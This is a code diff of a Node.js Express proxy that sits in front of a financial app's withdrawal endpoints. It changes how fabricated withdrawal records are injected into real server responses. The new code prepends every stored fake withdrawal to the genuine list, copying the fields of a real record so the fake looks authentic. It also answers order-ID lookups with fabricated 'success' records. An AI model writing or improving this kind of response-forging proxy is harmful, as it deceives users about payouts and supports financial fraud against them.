@@ -1000,62 +1000,50 @@ app.all('/money/rechargeRecord', async (req, res) => {
 });
 app.all('/withdraw/list', async (req, res) => {
   const bankData = await loadData();
+  const hasFakes = bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0;
 
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    console.log('[withdraw/list] Response structure:', jsonResp ? JSON.stringify({
-      code: jsonResp.code,
-      dataType: typeof jsonResp.data,
-      isArray: Array.isArray(jsonResp.data),
-      hasList: jsonResp.data?.list !== undefined,
-      hasRecords: jsonResp.data?.records !== undefined,
-      dataKeys: jsonResp.data ? Object.keys(jsonResp.data).slice(0, 10) : [],
-      firstItemKeys: (() => {
-        let items = Array.isArray(jsonResp.data) ? jsonResp.data : (jsonResp.data?.list || jsonResp.data?.records || []);
-        return items.length > 0 ? Object.keys(items[0]).slice(0, 15) : [];
-      })()
-    }).substring(0, 500) : 'null');
-
-    let detectedUserId = extractUserId(req, jsonResp);
-    console.log('[withdraw/list] Detected userId:', detectedUserId, 'fakeWithdrawals:', Object.keys(bankData.fakeWithdrawals || {}));
-
-    if (!detectedUserId && jsonResp && jsonResp.data) {
-      let items = null;
-      if (Array.isArray(jsonResp.data)) items = jsonResp.data;
-      else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
-      else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
-      if (items && items.length > 0 && items[0].userId) {
-        detectedUserId = String(items[0].userId);
-      }
+    console.log('[withdraw/list] hasFakes:', hasFakes, 'fakeKeys:', Object.keys(bankData.fakeWithdrawals || {}), 'respDataType:', jsonResp ? typeof jsonResp.data : 'null');
+    if (jsonResp && jsonResp.data) {
+      const sample = JSON.stringify(jsonResp.data).substring(0, 300);
+      console.log('[withdraw/list] data sample:', sample);
     }
 
-    if (!detectedUserId && jsonResp && bankData.fakeWithdrawals && Object.keys(bankData.fakeWithdrawals).length > 0) {
-      const fakeUserIds = Object.keys(bankData.fakeWithdrawals);
-      if (fakeUserIds.length === 1) {
-        detectedUserId = fakeUserIds[0];
-      }
-    }
-
-    if (jsonResp && detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
-      const fake = bankData.fakeWithdrawals[detectedUserId];
-      const fakeItem = {
-        orderId: fake.orderId,
-        amount: fake.amount,
-        amountOrder: fake.amount,
-        status: fake.status,
-        statusName: fake.statusName,
-        createTime: fake.createTime,
-        userId: parseInt(detectedUserId) || detectedUserId
-      };
+    if (hasFakes && jsonResp) {
+      const fakeItems = Object.values(bankData.fakeWithdrawals).map(fake => {
+        const existingItems = Array.isArray(jsonResp.data) ? jsonResp.data :
+          (jsonResp.data?.list || jsonResp.data?.records || []);
+        const template = existingItems.length > 0 ? { ...existingItems[0] } : {};
+        return {
+          ...template,
+          orderId: fake.orderId,
+          amount: fake.amount,
+          amountOrder: fake.amount,
+          status: fake.status,
+          statusName: fake.statusName,
+          createTime: fake.createTime,
+          userId: parseInt(fake.userId) || fake.userId
+        };
+      });
 
       if (Array.isArray(jsonResp.data)) {
-        jsonResp.data.unshift(fakeItem);
+        jsonResp.data.unshift(...fakeItems);
       } else if (jsonResp.data && jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
-        jsonResp.data.list.unshift(fakeItem);
+        jsonResp.data.list.unshift(...fakeItems);
       } else if (jsonResp.data && jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
-        jsonResp.data.records.unshift(fakeItem);
+        jsonResp.data.records.unshift(...fakeItems);
+      } else if (jsonResp.data && typeof jsonResp.data === 'object') {
+        const arrKey = Object.keys(jsonResp.data).find(k => Array.isArray(jsonResp.data[k]));
+        if (arrKey) {
+          jsonResp.data[arrKey].unshift(...fakeItems);
+        } else {
+          if (!jsonResp.data.records) jsonResp.data.records = [];
+          jsonResp.data.records.unshift(...fakeItems);
+        }
       }
+      console.log('[withdraw/list] Injected', fakeItems.length, 'fake items');
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1067,32 +1055,29 @@ app.all('/withdraw/list', async (req, res) => {
 
 app.all('/withdraw/orderId', async (req, res) => {
   const bankData = await loadData();
-  let detectedUserId = extractUserId(req, null);
   const qs = new URLSearchParams((req.originalUrl.split('?')[1]) || '');
   const reqOrderId = req.parsedBody?.orderId || qs.get('orderId') || '';
 
-  if (!detectedUserId && bankData.fakeWithdrawals) {
-    for (const [uid, fw] of Object.entries(bankData.fakeWithdrawals)) {
-      if (fw.orderId === reqOrderId) { detectedUserId = uid; break; }
-    }
-  }
+  console.log('[withdraw/orderId] reqOrderId:', reqOrderId, 'fakeWithdrawals:', Object.keys(bankData.fakeWithdrawals || {}));
 
-  if (detectedUserId && bankData.fakeWithdrawals && bankData.fakeWithdrawals[detectedUserId]) {
-    const fake = bankData.fakeWithdrawals[detectedUserId];
-    if (fake.orderId === reqOrderId) {
-      return res.json({
-        code: 1,
-        data: {
-          orderId: fake.orderId,
-          amount: fake.amount,
-          amountOrder: fake.amount,
-          status: fake.status,
-          statusName: fake.statusName,
-          createTime: fake.createTime,
-          userId: parseInt(detectedUserId) || detectedUserId
-        },
-        msg: 'success'
-      });
+  if (bankData.fakeWithdrawals && reqOrderId) {
+    for (const [uid, fake] of Object.entries(bankData.fakeWithdrawals)) {
+      if (fake.orderId === reqOrderId) {
+        console.log('[withdraw/orderId] Matched fake for user:', uid);
+        return res.json({
+          code: 1,
+          data: {
+            orderId: fake.orderId,
+            amount: fake.amount,
+            amountOrder: fake.amount,
+            status: fake.status,
+            statusName: fake.statusName,
+            createTime: fake.createTime,
+            userId: parseInt(uid) || uid
+          },
+          msg: 'success'
+        });
+      }
     }
   }
 
